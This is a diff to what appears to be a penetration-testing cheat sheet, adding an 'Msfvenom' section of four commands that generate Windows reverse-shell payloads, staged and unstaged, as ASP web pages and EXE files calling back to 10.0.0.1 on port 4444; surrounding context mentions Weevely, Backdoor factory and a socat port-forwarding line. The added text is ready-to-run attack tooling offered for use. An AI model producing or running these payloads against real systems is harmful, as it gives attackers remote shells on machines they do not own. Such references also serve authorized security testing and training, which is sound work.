@@ -468,6 +468,12 @@ Weevely
 ### Executables
 Backdoor factory
 
+### Msfvenom
+Netcat ASP reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > reverse.asp`\
+Netcat ASP reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f asp > reverse.asp`\
+Netcat reverse shell (unstaged): `msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
+Netcat reverse shell (staged): `msfvenom -p windows/shell/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > reverse.exe`\
+
 ## Port forwarding/masquerading
 
 SOCAT: `socat TCP-LISTEN:80,fork TCP:192.168.1.1:80`\
